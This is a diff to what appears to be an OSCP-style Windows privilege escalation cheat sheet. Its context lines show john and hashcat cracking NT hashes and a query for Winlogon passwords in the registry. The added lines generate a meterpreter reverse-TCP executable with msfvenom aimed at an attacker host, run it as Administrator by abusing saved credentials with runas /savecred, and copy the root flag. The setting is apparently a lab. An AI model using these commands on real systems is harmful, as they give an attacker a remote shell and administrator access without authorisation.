@@ -95,9 +95,22 @@ john --format=nt hash.txt --wordlist=rockyou.txt
 hashcat -m 1000 hash.txt rockyou.txt
 ```
 ### Saved Windows Credentials
+
 ```bash
+# List saved credentials:
 cmdkey /list
+
+# create a reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4747 -f exe -o oscpp.exe
+
+# run the reverse
+runas /savecred /user:Access\\Administrator C:\\PrivEsc\\oscpp.exe
+
+# copy flag as logged in user
+runas /user:Access\\Administrator /savecred "cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\security\\Desktop\\flag.txt"
 ```
+
+
 ### Look for Passwords in Configs and Registry
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
